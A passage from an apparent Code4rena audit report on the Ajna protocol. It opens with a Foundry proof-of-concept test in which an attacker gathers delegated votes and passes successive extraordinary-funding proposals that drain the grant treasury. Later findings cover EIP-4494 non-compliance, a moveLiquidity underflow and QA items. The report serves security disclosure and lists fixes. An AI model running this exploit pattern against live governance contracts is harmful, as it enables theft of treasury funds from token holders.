        function test_drainTreasury() external {
          /*
            STATUS:

            - Attacker has 385M of ajna tokens
            - Holders from 2 to 6 have 23M of ajna tokens each, total of = 115M
            - TotalSupply is 1B ajna tokens.
            - Treasury is 300M ajna tokens
            - Non-Treasury tokens are 700M tokens
          */
          assertEq(_token.balanceOf(_attacker), 385_000_000 * 1e18);
          assertEq(_token.balanceOf(_tokenHolder2), 23_000_000 * 1e18);
          assertEq(_token.balanceOf(_tokenHolder3), 23_000_000 * 1e18);
          assertEq(_token.balanceOf(_tokenHolder4), 23_000_000 * 1e18);
          assertEq(_token.balanceOf(_tokenHolder5), 23_000_000 * 1e18);
          assertEq(_token.balanceOf(_tokenHolder6), 23_000_000 * 1e18);
          assertEq(_token.totalSupply(), 1_000_000_000 * 1e18);
          assertEq(_grantFund.treasury(), 300_000_000 * 1e18);
          assertEq(_grantFund.getSliceOfNonTreasury(1e18), 700_000_000 * 1e18);

          // Attacker self delegates
          _delegateTo(_token, _votersArrAttacker, _votersArrAttacker);
          // All holders delegate their tokens to the attacker.
          _delegateTo(_token, _votersArr, _helperAttackerDelegatee);

          vm.roll(_startBlock2 + 100);

          // set proposal params
          uint256 endBlockParam = block.number + 100_000;
           // 150M tokens requested, that is 50% of treasury
          uint256 tokensRequestedParam = 150_000_000 * 1e18;

          // generate proposal targets
          address[] memory targets = new address[](1);
          targets[0] = address(_token);

          // generate proposal values
          uint256[] memory values = new uint256[](1);
          values[0] = 0;

          // generate proposal calldata
          bytes[] memory calldatas = new bytes[](1);
          calldatas[0] = abi.encodeWithSignature(
            "transfer(address,uint256)",
            _attacker,
            tokensRequestedParam
          );

          // create and submit proposal
          TestProposalExtraordinary memory testProposal = _createProposalExtraordinary(
            _grantFund,
            _attacker,
            endBlockParam,
            targets,
            values,
            calldatas,
            "We are requesting 50% of the treasury since this is a super important and big development for the ecosystem"
          );

          // Attacker has 500M of voting power which is ~ 71.4% of Non-Treasury Tokens
          uint256 attackerVotingPowerForEP = _grantFund.getVotesExtraordinary(_attacker, testProposal.proposalId);
          assertEq(attackerVotingPowerForEP, 500_000_000 * 1e18);

          changePrank(_attacker);
          _grantFund.voteExtraordinary(testProposal.proposalId);

          // Proposal state is Succeeded with only a 500M voting power.
          // Attacker was able to request 50% of treasury with only 71.4% of the Non-treasury tokens.
          // Whitepaper says that in order to request 50% of tokens (1st proposal, so Minium Threshold equals 50%), 
          // the proposal will need 50% + 50% = 100% of Non-Treasury tokens. Which here is demostrated that you only need 71.4%.
          IFunding.ProposalState proposalState = _grantFund.state(testProposal.proposalId);
          assertEq(uint8(proposalState), uint8(IFunding.ProposalState.Succeeded));

          // execute proposal
          _grantFund.executeExtraordinary(targets, values, calldatas, keccak256(bytes(testProposal.description)));

          /*
            Status after the 1st proposal success:

            - Attacker has 535M of ajna tokens
            - Holders from 2 to 6 have 23M of ajna tokens each, total of = 125M
            - TotalSupply is 1B ajna tokens.
            - Treasury is 150M ajna tokens
            - Non-Treasury tokens are 850M tokens
          */
          assertEq(_token.balanceOf(_attacker), 535_000_000 * 1e18);
          assertEq(_token.balanceOf(_tokenHolder2), 23_000_000 * 1e18);
          assertEq(_token.balanceOf(_tokenHolder3), 23_000_000 * 1e18);
          assertEq(_token.balanceOf(_tokenHolder4), 23_000_000 * 1e18);
          assertEq(_token.balanceOf(_tokenHolder5), 23_000_000 * 1e18);
          assertEq(_token.balanceOf(_tokenHolder6), 23_000_000 * 1e18);
          assertEq(_token.totalSupply(), 1_000_000_000 * 1e18);
          assertEq(_grantFund.treasury(), 150_000_000 * 1e18);
          assertEq(_grantFund.getSliceOfNonTreasury(1e18), 850_000_000 * 1e18);

          /*
            After the 1st proposal has succeed, the attacker now can drain the treasury alone, without the previous delegators.

            This happens because the formula actually makes it easier to execute further extraordinary proposals.

            For example the previous proposal required 71.4% of non-treasury tokens to pass a proposal of 50% of treasury tokens.

            I will show how the second proposal will only require 62.94% of non-treasury tokens to pass a proposal of 45% of treasury tokens.
            Which is a slightly increase from 500M needed to 535M needed, that is only a 7% difficulty increase. Whereas the attacker increased his
            voting power from 385M to 535M (thanks to proposal 1) which is a 39% increase in his voting power.
          */

          // Holders now delegates for them
          _delegateTo(_token, _votersArrAttacker, _votersArrAttacker);
          _delegateTo(_token, _votersArr, _votersArr);
          

          vm.roll(_startBlock2 + 500);

          // set proposal params
          uint256 endBlockParam2 = block.number + 100_000;
           // 67.5 tokens requested, that is 45% of treasury
          uint256 tokensRequestedParam2 = 67_500_000 * 1e18;

          // generate proposal targets
          address[] memory targets2 = new address[](1);
          targets2[0] = address(_token);

          // generate proposal values
          uint256[] memory values2 = new uint256[](1);
          values2[0] = 0;

          // generate proposal calldata
          bytes[] memory calldatas2 = new bytes[](1);
          calldatas2[0] = abi.encodeWithSignature(
            "transfer(address,uint256)",
            _attacker,
            tokensRequestedParam2
          );

          // create and submit proposal
          TestProposalExtraordinary memory testProposal2 = _createProposalExtraordinary(
            _grantFund,
            _attacker,
            endBlockParam2,
            targets2,
            values2,
            calldatas2,
            "Thanks for proposal 1, now I will drain the treasury"
          );

          // Attacker has 535M of voting power which is ~ 62.94% of Non-Treasury Tokens
          uint256 attackerVotingPowerForEP2 = _grantFund.getVotesExtraordinary(_attacker, testProposal2.proposalId);
          assertEq(attackerVotingPowerForEP2, 535_000_000 * 1e18);

           changePrank(_attacker);
          _grantFund.voteExtraordinary(testProposal2.proposalId);

          // Attacher succeed
          IFunding.ProposalState proposalState2 = _grantFund.state(testProposal2.proposalId);
          assertEq(uint8(proposalState2), uint8(IFunding.ProposalState.Succeeded));

          // execute proposal
          _grantFund.executeExtraordinary(targets2, values2, calldatas2, keccak256(bytes(testProposal2.description)));

          // Attacker balance is now 602.5M
          assertEq(_token.balanceOf(_attacker), 602_500_000 * 1e18);

          // The attacker can continue requesting (1- MiniumThreshold)% of the treasury until threshold becomes 100%.
        }

        function _delegateToDelegatees(IAjnaToken token_, address delegator_, address delegatee_) internal {
            changePrank(delegator_);
            token_.delegate(delegatee_);
        }

        function _delegateTo(IAjnaToken token_, address[] memory delegators_, address[] memory delegatees_) internal {
            for (uint256 i = 0; i < delegators_.length; ++i) {
                _delegateToDelegatees(token_, delegators_[i], delegatees_[i]);
            }
        }
    }

3. Run `forge test --match-contract ExploitEF --match-test test_drainTreasury`

### Recommended Mitigation Steps

Re-write the constraint as follows:

`votesReceived >= _getSliceOfNonTreasury(percentageOfTreasuryTokensRequested) + _getSliceOfNonTreasury(minThresholdPercentage)`

**[Picodes (judge) decreased severity to Medium](https://github.com/code-423n4/2023-05-ajna-findings/issues/164#issuecomment-1569224507)**

**[ith-harvey (Ajna) confirmed and commented](https://github.com/code-423n4/2023-05-ajna-findings/issues/164#issuecomment-1571157401):**
 > We removed the EFM.



***

## [[M-13]  `PositionManager` & `PermitERC721` Failure to comply with the EIP-4494](https://github.com/code-423n4/2023-05-ajna-findings/issues/141)
*Submitted by [Haipls](https://github.com/code-423n4/2023-05-ajna-findings/issues/141)*

<https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/PositionManager.sol#L42><br>
<https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/base/PermitERC721.sol#L77><br>
<https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/base/PermitERC721.sol#L13><br>
<https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/PositionManager.sol#L57>

The contract `PositionManager.sol` inherits from `PermitERC721.sol`, but both contracts incorrectly implement the `EIP-4494` standard, which is an important part of the contract. This leads to the following issues:

*   `PositionManager` & `PermitERC721` are not `EIP-4494` compliant
*   Automatic tools will not be able to determine that this contract has a `permit` for `ERC721`
*   Third-party contracts will not be able to determine that this is `EIP-4494`
*   Inability to correctly track which `nonces` are currently relevant, leading to the creation of invalid signatures/signatures for the future
*   No support for compact signatures

### Proof of Concept

According to the specifications of the standard [EIP-4494](https://eips.ethereum.org/EIPS/eip-4494), the following violations were found:

1.  `EIP-4494` requires the implementation of `IERC165` and the indication of support for the interface `0x5604e225`, **which is not implemented**

2.  `EIP-4494` requires the presence of the function `function nonces(uint256 tokenId) external view returns(uint256);` **which is missing**

3.  `EIP-4494` requires the function `function permit(address spender, uint256 tokenId, uint256 deadline, bytes memory sig) external;`, **which is incorrectly declared** as

```javascript
File: 2023-05-ajna\ajna-core\src\base\PermitERC721.sol

77:     function permit(
78:         address spender_, uint256 tokenId_, uint256 deadline_, uint8 v_, bytes32 r_, bytes32 s_
79:     ) external {

```

### Tools Used

*   Manual review
*   Foundry
*   <https://eips.ethereum.org/EIPS/eip-4494>

### Recommended Mitigation Steps

*   Correct the identified non-compliance issues so that the contracts meet the standard
*   Or remove references to the standard and provide a reference to the Uniswap V3 implementation

**[MikeHathaway (Ajna) confirmed](https://github.com/code-423n4/2023-05-ajna-findings/issues/141#issuecomment-1555088600)**

**[Picodes (judge) decreased severity to Low and commented](https://github.com/code-423n4/2023-05-ajna-findings/issues/141#issuecomment-1570263947):**
 > Downgrading to Low as part of this is out of scope here, and the rest can be considered an instance of "function incorrect as to spec"

**[Haipls (warden) commented](https://github.com/code-423n4/2023-05-ajna-findings/issues/141#issuecomment-1570822000):**
 > 
> Hi @Picodes - The `ajna-core/src/base/PermitERC721.sol` is indeed out of scope, which subsequently makes points `1` and `3` out of scope as well. However, I'd like you to take another look at point `2`.
> 
> > EIP-4494 necessitates the inclusion of the function: `function nonces(uint256 tokenId) external view returns(uint256);` which is currently absent.
> 
> We can see that `PermitERC721` is an abstract contract which only partially implements EIP-4494, and it does so incorrectly, thereby making this part out of scope. However, it also imposes a requirement (abstract contract with abstract `_getAndIncrementNonce()` method) on `PositionManager` to implement `nonces` method on its end, **which is within scope**. This conclusion can be drawn from the following method:
> 
> ```c
> File: ajna-core/src/base/PermitERC721.sol
> 
> 29:    /** @dev Gets the current nonce for a token ID and then increments it, returning the original value */
> 30:    function _getAndIncrementNonce(uint256 tokenId_) internal virtual returns (uint256);
> ```
> 
> This suggests that the `nonces` method must be implemented in `PositionManager`, *PermitERC721 transfers this responsibility to descendants*. And according to point 2, `PositionManager` is the final contract that violates the `EIP-4494` standard, which is indeed within scope. According to [EIP-4494](https://eips.ethereum.org/EIPS/eip-4494) documentation, the `nonces` declaration is stated under **Three new functions MUST be added to ERC-721**:, which, in my opinion, can't be simply dismissed as `function incorrect as to spec`. According to the practice I've observed, any violation of the standard with `MUST label` is usually rated as `Medium`.
> 
> Examples:
> - https://github.com/code-423n4/2023-02-ethos-findings/issues/638
> - https://github.com/code-423n4/2023-04-caviar-findings/issues/44
> - etc...
>   
> Thank you.

**[Picodes (judge) increased severity to Medium and commented](https://github.com/code-423n4/2023-05-ajna-findings/issues/141#issuecomment-1575702153):**
 > @Haipls - your point is valid: `PositionManager` should implement `nonces`. I was reluctant to give this Medium severity as there are issues in `PermitERC721` so the contract couldn't implement the EIP anyway, but, after reflection and discussing it with another judge, the problem is significant enough to justify Medium severity.



***

## [[M-14] `PositionManager.moveLiquidity` could revert due to underflow](https://github.com/code-423n4/2023-05-ajna-findings/issues/99)
*Submitted by [0xnev](https://github.com/code-423n4/2023-05-ajna-findings/issues/99), also found by [mrpathfindr](https://github.com/code-423n4/2023-05-ajna-findings/issues/261) and [0xnev](https://github.com/code-423n4/2023-05-ajna-findings/issues/97)*

[PositionManager.sol#L320](https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-core/src/PositionManager.sol#L320)

```solidity
function moveLiquidity(
    MoveLiquidityParams calldata params_
) external override mayInteract(params_.pool, params_.tokenId) nonReentrant {
    Position storage fromPosition = positions[params_.tokenId][params_.fromIndex];

    MoveLiquidityLocalVars memory vars;
    vars.depositTime = fromPosition.depositTime;

    // handle the case where owner attempts to move liquidity after they've already done so
    if (vars.depositTime == 0) revert RemovePositionFailed();

    // ensure bucketDeposit accounts for accrued interest
    IPool(params_.pool).updateInterest();

    // retrieve info of bucket from which liquidity is moved  
    (
        vars.bucketLP,
        vars.bucketCollateral,
        vars.bankruptcyTime,
        vars.bucketDeposit,
    ) = IPool(params_.pool).bucketInfo(params_.fromIndex);

    // check that bucket hasn't gone bankrupt since memorialization
    if (vars.depositTime <= vars.bankruptcyTime) revert BucketBankrupt();

    // calculate the max amount of quote tokens that can be moved, given the tracked LP
    vars.maxQuote = _lpToQuoteToken(
        vars.bucketLP,
        vars.bucketCollateral,
        vars.bucketDeposit,
        fromPosition.lps,
        vars.bucketDeposit,
        _priceAt(params_.fromIndex)
    );

    EnumerableSet.UintSet storage positionIndex = positionIndexes[params_.tokenId];

    // remove bucket index from which liquidity is moved from tracked positions
    if (!positionIndex.remove(params_.fromIndex)) revert RemovePositionFailed();

    // update bucket set at which a position has liquidity
    // slither-disable-next-line unused-return
    positionIndex.add(params_.toIndex);

    // move quote tokens in pool
    (
        vars.lpbAmountFrom,
        vars.lpbAmountTo,
    ) = IPool(params_.pool).moveQuoteToken(
        vars.maxQuote,
        params_.fromIndex,
        params_.toIndex,
        params_.expiry
    );

    Position storage toPosition = positions[params_.tokenId][params_.toIndex];

    // update position LP state
    fromPosition.lps -= vars.lpbAmountFrom;
    toPosition.lps   += vars.lpbAmountTo;
    // update position deposit time to the from bucket deposit time
    toPosition.depositTime = vars.depositTime;

    emit MoveLiquidity(
        ownerOf(params_.tokenId),
        params_.tokenId,
        params_.fromIndex,
        params_.toIndex,
        vars.lpbAmountFrom,
        vars.lpbAmountTo
    );
}
```

If lp position is worth more than when at deposit time based on amount of quote token moved which could likely be the case due to interest accrued or simply from exchange rates favoring quote token, `moveLiquidity` could revert due to underflow as `vars.lpbAmountFrom` could be greater than `fromPosition.lps` (i.e. `vars.lpbAmountFrom > fromPosition.lps`)

Since call to `Position.moveLiquidity()` is supposed to move all lp positions attached to associated NFT within a bucket, we can simply delete the `fromPosition` mapping to remove bucket index at which a position has moved liquidity to prevent potential cases where `Position.moveLiquidity()` could revert due to underflow in this line:

```solidity
fromPosition.lps -= vars.lpbAmountFrom;
```

### Recommendation

LP tracked by position manager at bucket index should be deleted similar to `redeemPositions`, if not `Position.moveLiquidity` can likely underflow.

```solidity
function moveLiquidity(
    MoveLiquidityParams calldata params_
) external override mayInteract(params_.pool, params_.tokenId) nonReentrant {
    ...

    // update position LP state
    fromPosition.lps -= vars.lpbAmountFrom;
    toPosition.lps   += vars.lpbAmountTo;
    // update position deposit time to the from bucket deposit time
    toPosition.depositTime = vars.depositTime;
++  delete fromPosition  

    emit MoveLiquidity(
        ownerOf(params_.tokenId),
        params_.tokenId,
        params_.fromIndex,
        params_.toIndex,
        vars.lpbAmountFrom,
        vars.lpbAmountTo
    );
}
```

**[MikeHathaway (Ajna) confirmed](https://github.com/code-423n4/2023-05-ajna-findings/issues/99#issuecomment-1555081319)**



***

# Low Risk and Non-Critical Issues

For this audit, 39 reports were submitted by wardens detailing low risk and non-critical issues. The [report highlighted below](https://github.com/code-423n4/2023-05-ajna-findings/issues/299) by **rbserver** received the top score from the judge.

*The following wardens also submitted reports: [MohammedRizwan](https://github.com/code-423n4/2023-05-ajna-findings/issues/499), [Bason](https://github.com/code-423n4/2023-05-ajna-findings/issues/497), [lfzkoala](https://github.com/code-423n4/2023-05-ajna-findings/issues/496), [naman1778](https://github.com/code-423n4/2023-05-ajna-findings/issues/495), [pontifex](https://github.com/code-423n4/2023-05-ajna-findings/issues/490), [yjrwkk](https://github.com/code-423n4/2023-05-ajna-findings/issues/484), [teawaterwire](https://github.com/code-423n4/2023-05-ajna-findings/issues/480), [Jerry0x](https://github.com/code-423n4/2023-05-ajna-findings/issues/477), [Aymen0909](https://github.com/code-423n4/2023-05-ajna-findings/issues/473), [DadeKuma](https://github.com/code-423n4/2023-05-ajna-findings/issues/467), [REACH](https://github.com/code-423n4/2023-05-ajna-findings/issues/437), [nadin](https://github.com/code-423n4/2023-05-ajna-findings/issues/434), [lukris02](https://github.com/code-423n4/2023-05-ajna-findings/issues/419), [GG\_Security](https://github.com/code-423n4/2023-05-ajna-findings/issues/407), [sakshamguruji](https://github.com/code-423n4/2023-05-ajna-findings/issues/404), [descharre](https://github.com/code-423n4/2023-05-ajna-findings/issues/398), [bytes032](https://github.com/code-423n4/2023-05-ajna-findings/issues/375), [hals](https://github.com/code-423n4/2023-05-ajna-findings/issues/359), [patitonar](https://github.com/code-423n4/2023-05-ajna-findings/issues/330), [BGSecurity](https://github.com/code-423n4/2023-05-ajna-findings/issues/300), [squeaky\_cactus](https://github.com/code-423n4/2023-05-ajna-findings/issues/283), [Shogoki](https://github.com/code-423n4/2023-05-ajna-findings/issues/278), [wonjun](https://github.com/code-423n4/2023-05-ajna-findings/issues/276), [T1MOH](https://github.com/code-423n4/2023-05-ajna-findings/issues/258), [aviggiano](https://github.com/code-423n4/2023-05-ajna-findings/issues/255), [fatherOfBlocks](https://github.com/code-423n4/2023-05-ajna-findings/issues/247), [Audit\_Avengers](https://github.com/code-423n4/2023-05-ajna-findings/issues/243), [ayden](https://github.com/code-423n4/2023-05-ajna-findings/issues/211), [UniversalCrypto](https://github.com/code-423n4/2023-05-ajna-findings/issues/194), [ABAIKUNANBAEV](https://github.com/code-423n4/2023-05-ajna-findings/issues/183), [0xnev](https://github.com/code-423n4/2023-05-ajna-findings/issues/166), [berlin-101](https://github.com/code-423n4/2023-05-ajna-findings/issues/162), [kodyvim](https://github.com/code-423n4/2023-05-ajna-findings/issues/153), [codeslide](https://github.com/code-423n4/2023-05-ajna-findings/issues/138), [Jorgect](https://github.com/code-423n4/2023-05-ajna-findings/issues/127), [BRONZEDISC](https://github.com/code-423n4/2023-05-ajna-findings/issues/56), [kaveyjoe](https://github.com/code-423n4/2023-05-ajna-findings/issues/41), and [Sathish9098](https://github.com/code-423n4/2023-05-ajna-findings/issues/23).*

## QA REPORT

| |Issue|
|-|:-|
| [01] | `CHALLENGE_PERIOD_LENGTH`, `DISTRIBUTION_PERIOD_LENGTH`, `FUNDING_PERIOD_LENGTH`, AND `MAX_EFM_PROPOSAL_LENGTH` ARE HARDCODED BASED ON 7200 BLOCKS PER DAY |
| [02] | AMBIGUITY IN `StandardFunding._standardProposalState` FUNCTION |
| [03] | `ExtraordinaryFundingProposal.votesReceived` IN `ExtraordinaryFunding` CONTRACT IS `uint120` INSTEAD OF `uint128` |
| [04] | CALLING `ExtraordinaryFunding.proposeExtraordinary` AND `StandardFunding.proposeStandard` FUNCTIONS CAN REVERT AND WASTE GAS |
| [05] | CODE COMMENT IN `ExtraordinaryFunding._extraordinaryProposalSucceeded` FUNCTION CAN BE INCORRECT |
| [06] | CODE COMMENT FOR `CHALLENGE_PERIOD_LENGTH` CAN BE MORE ACCURATE |
| [07] | SETTING `support` TO `1` WHEN `voteParams_.votesUsed < 0` IS FALSE IN `StandardFunding._fundingVote` FUNCTION IS REDUNDANT |
| [08] | REDUNDANT EXECUTION OF `if (sumOfTheSquareOfVotesCast > type(uint128).max) revert InsufficientVotingPower()` IN `StandardFunding._fundingVote` FUNCTION |
| [09] | `InvalidVote` ERROR CAN BE MORE DESCRIPTIVE |
| [10] | UNDERSCORES CAN BE ADDED FOR NUMBERS |
| [11] | `uint256` CAN BE USED INSTEAD OF `uint` |
| [12] | SPACES CAN BE ADDED FOR BETTER READABILITY |

## [01] `CHALLENGE_PERIOD_LENGTH`, `DISTRIBUTION_PERIOD_LENGTH`, `FUNDING_PERIOD_LENGTH`, AND `MAX_EFM_PROPOSAL_LENGTH` ARE HARDCODED BASED ON 7200 BLOCKS PER DAY
The following `CHALLENGE_PERIOD_LENGTH`, `DISTRIBUTION_PERIOD_LENGTH`, `FUNDING_PERIOD_LENGTH`, and `MAX_EFM_PROPOSAL_LENGTH` are hardcoded and assume that the number of blocks per day is 7200 and the number of seconds per block is 12. Yet, it is possible that the number of seconds per block is more or less than 12 due to network traffic and future chain upgrades. When the number of seconds per block is no longer 12, the durations corresponding to `CHALLENGE_PERIOD_LENGTH`, `DISTRIBUTION_PERIOD_LENGTH`, `FUNDING_PERIOD_LENGTH`, and `MAX_EFM_PROPOSAL_LENGTH` are no longer 7, 90, 10, and 30 days, which break the duration specifications for various phases. This can cause unexpectedness to users; for example, when the duration for `FUNDING_PERIOD_LENGTH` becomes less than 10 days, a user, who expects that she or he could vote on the 10th day, can fail to vote unexpectedly on that 10th day. To avoid unexpectedness and disputes, please consider using `block.timestamp` instead of blocks for defining durations for various phases in the `StandardFunding` and `ExtraordinaryFunding` contracts.

https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L29-L34
```solidity
    /**
     * @notice Length of the challengephase of the distribution period in blocks.
     * @dev    Roughly equivalent to the number of blocks in 7 days.
     * @dev    The period in which funded proposal slates can be checked in updateSlate.
     */
    uint256 internal constant CHALLENGE_PERIOD_LENGTH = 50400;
```

https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L36-L40
```solidity
    /**
     * @notice Length of the distribution period in blocks.
     * @dev    Roughly equivalent to the number of blocks in 90 days.
     */
    uint48 internal constant DISTRIBUTION_PERIOD_LENGTH = 648000;
```

https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L42-L46
```solidity
    /**
     * @notice Length of the funding phase of the distribution period in blocks.
     * @dev    Roughly equivalent to the number of blocks in 10 days.
     */
    uint256 internal constant FUNDING_PERIOD_LENGTH = 72000;
```

https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/ExtraordinaryFunding.sol#L20-L23
```solidity
    /**
     * @notice The maximum length of a proposal's voting period, in blocks.
     */
    uint256 internal constant MAX_EFM_PROPOSAL_LENGTH = 216_000; // number of blocks in one month
```

## [02] AMBIGUITY IN `StandardFunding._standardProposalState` FUNCTION
When `block.number` is bigger than `_distributions[proposal.distributionId].endBlock`, it is possible that the proposal is in the challenge phase. In the challenge phase, calling the following `StandardFunding._standardProposalState` function, which further calls the `StandardFunding._standardFundingVoteSucceeded` function below, can return `ProposalState.Succeeded` if the proposal is found in `_fundedProposalSlates[_distributions[distributionId].fundedSlateHash]` at that moment. However, during the challenge phase, the `StandardFunding.updateSlate` function below can be called to update `_fundedProposalSlates` for the mentioned `_distributions[distributionId].fundedSlateHash]`. Such update can exclude the same proposal from `_fundedProposalSlates[_distributions[distributionId].fundedSlateHash]`; calling the `StandardFunding._standardProposalState` function again would then return `ProposalState.Defeated` for such proposal. Hence, the `StandardFunding._standardProposalState` function cannot properly determine the status of the corresponding proposal in the challenge phase. To prevent users from being misled, please update the `StandardFunding._standardProposalState` function to return a state, which is not `Succeeded` or `Defeated`, to indicate that the proposal's success state is to be determined when the time is in the challenge phase.

https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L505-L512
```solidity
    function _standardProposalState(uint256 proposalId_) internal view returns (ProposalState) {
        Proposal memory proposal = _standardFundingProposals[proposalId_];

        if (proposal.executed)                                                     return ProposalState.Executed;
        else if (_distributions[proposal.distributionId].endBlock >= block.number) return ProposalState.Active;
        else if (_standardFundingVoteSucceeded(proposalId_))                      return ProposalState.Succeeded;
        else                                                                       return ProposalState.Defeated;
    }
```

https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L860-L865
```solidity
    function _standardFundingVoteSucceeded(
        uint256 proposalId_
    ) internal view returns (bool) {
        uint24 distributionId = _standardFundingProposals[proposalId_].distributionId;
        return _findProposalIndex(proposalId_, _fundedProposalSlates[_distributions[distributionId].fundedSlateHash]) != -1;
    }
```

https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L300-L340
```solidity
    function updateSlate(
        uint256[] calldata proposalIds_,
        uint24 distributionId_
    ) external override returns (bool newTopSlate_) {
        ...
        // if slate of proposals is new top slate, update state
        if (newTopSlate_) {
            uint256[] storage existingSlate = _fundedProposalSlates[newSlateHash];

            for (uint i = 0; i < numProposalsInSlate; ) {

                // update list of proposals to fund
                existingSlate.push(proposalIds_[i]);

                unchecked { ++i; }
            }

            // update hash to point to the new leading slate of proposals
            currentDistribution.fundedSlateHash = newSlateHash;

            emit FundedSlateUpdated(
                distributionId_,
                newSlateHash
            );
        }
    }
```

## [03] `ExtraordinaryFundingProposal.votesReceived` IN `ExtraordinaryFunding` CONTRACT IS `uint120` INSTEAD OF `uint128`
In the `StandardFunding` contract, `Proposal.votesReceived` is `uint128`.

https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/interfaces/IStandardFunding.sol#L122-L129
```solidity
    struct Proposal {
        ...
        uint128 votesReceived;        // accumulator of screening votes received by a proposal
        ...
    }
```

Yet, in the `ExtraordinaryFunding` contract, `ExtraordinaryFundingProposal.votesReceived` is `uint120`. Calling the `ExtraordinaryFunding.voteExtraordinary` function below by a user, who has the voting power being more than `type(uint120).max`, can revert, which causes such user to waste gas and fail to vote for the corresponding proposal. This degrades the user experience because such user, who is familiar with `Proposal.votesReceived` in the `StandardFunding` contract, could think that `ExtraordinaryFundingProposal.votesReceived` in the `ExtraordinaryFunding` contract would be `uint128` as well. To be more consistent and prevent disputes, please consider using `ExtraordinaryFundingProposal.votesReceived` as `uint128` instead of `uint120` in the `ExtraordinaryFunding` contract.

https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/interfaces/IExtraordinaryFunding.sol#L32-L39
```solidity
    struct ExtraordinaryFundingProposal {
        ...
        uint120  votesReceived;   // Total votes received for this proposal.
        ...
    }
```

https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/ExtraordinaryFunding.sol#L131-L157
```solidity
    function voteExtraordinary(
        uint256 proposalId_
    ) external override returns (uint256 votesCast_) {
        ...
        // check voting power at snapshot block and update proposal votes
        votesCast_ = _getVotesExtraordinary(msg.sender, proposalId_);
        proposal.votesReceived += SafeCast.toUint120(votesCast_);
        ...
    }
```

## [04] CALLING `ExtraordinaryFunding.proposeExtraordinary` AND `StandardFunding.proposeStandard` FUNCTIONS CAN REVERT AND WASTE GAS
Calling the following `ExtraordinaryFunding.proposeExtraordinary` and `StandardFunding.proposeStandard` functions will call the `Funding._validateCallDatas` function below. Calling the `Funding._validateCallDatas` function will revert if `targets_[i] != ajnaTokenAddress || values_[i] != 0` is true. Hence, the `ExtraordinaryFunding.proposeExtraordinary` and `StandardFunding.proposeStandard` functions cannot be used to create proposals for calling addresses other than `ajnaTokenAddress` or sending ETH. When users are unaware of this, they could believe that proposals for general purposes can be created and executed; yet, because calling `ExtraordinaryFunding.proposeExtraordinary` and `StandardFunding.proposeStandard` functions with `targets_` being not `ajnaTokenAddress` or `values_` being positive revert, these users would waste their gas for nothing. To avoid confusion and disputes, please consider updating the `ExtraordinaryFunding.proposeExtraordinary` and `StandardFunding.proposeStandard` functions so `targets_` and `values_` would only be `ajnaTokenAddress` and 0 and not be specified by users.

https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/ExtraordinaryFunding.sol#L85-L124
```solidity
    function proposeExtraordinary(
        uint256 endBlock_,
        address[] memory targets_,
        uint256[] memory values_,
        bytes[] memory calldatas_,
        string memory description_) external override returns (uint256 proposalId_) {
        ...
        uint128 totalTokensRequested = _validateCallDatas(targets_, values_, calldatas_);
        ...
    }
```

https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L366-L404
```solidity
    function proposeStandard(
        address[] memory targets_,
        uint256[] memory values_,
        bytes[] memory calldatas_,
        string memory description_
    ) external override returns (uint256 proposalId_) {
        ...
        newProposal.tokensRequested = _validateCallDatas(targets_, values_, calldatas_); // check proposal parameters are valid and update tokensRequested
        ...
    }
```

https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/Funding.sol#L103-L141
```solidity
    function _validateCallDatas(
        address[] memory targets_,
        uint256[] memory values_,
        bytes[] memory calldatas_
    ) internal view returns (uint128 tokensRequested_) {

        // check params have matching lengths
        if (targets_.length == 0 || targets_.length != values_.length || targets_.length != calldatas_.length) revert InvalidProposal();

        for (uint256 i = 0; i < targets_.length;) {

            // check targets and values params are valid
            if (targets_[i] != ajnaTokenAddress || values_[i] != 0) revert InvalidProposal();
            ...
        }
    }
```

## [05] CODE COMMENT IN `ExtraordinaryFunding._extraordinaryProposalSucceeded` FUNCTION CAN BE INCORRECT
In the following `ExtraordinaryFunding._extraordinaryProposalSucceeded` function, the comment for `(votesReceived >= tokensRequested_ + _getSliceOfNonTreasury(minThresholdPercentage))` is `succeeded if proposal's votes received doesn't exceed the minimum threshold required`. However, `(votesReceived >= tokensRequested_ + _getSliceOfNonTreasury(minThresholdPercentage))` can only be true when the proposal's votes received meet or exceed such minimum threshold, which is the opposite of the comment. To prevent confusion, please consider updating the comment to match the corresponding code.

https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/ExtraordinaryFunding.sol#L164-L178
```solidity
    function _extraordinaryProposalSucceeded(
        uint256 proposalId_,
        uint256 tokensRequested_
    ) internal view returns (bool) {
        uint256 votesReceived          = uint256(_extraordinaryFundingProposals[proposalId_].votesReceived);
        uint256 minThresholdPercentage = _getMinimumThresholdPercentage();

        return
            // succeeded if proposal's votes received doesn't exceed the minimum threshold required
            (votesReceived >= tokensRequested_ + _getSliceOfNonTreasury(minThresholdPercentage))
            &&
            // succeeded if tokens requested are available for claiming from the treasury
            (tokensRequested_ <= _getSliceOfTreasury(Maths.WAD - minThresholdPercentage))
        ;
    }
```

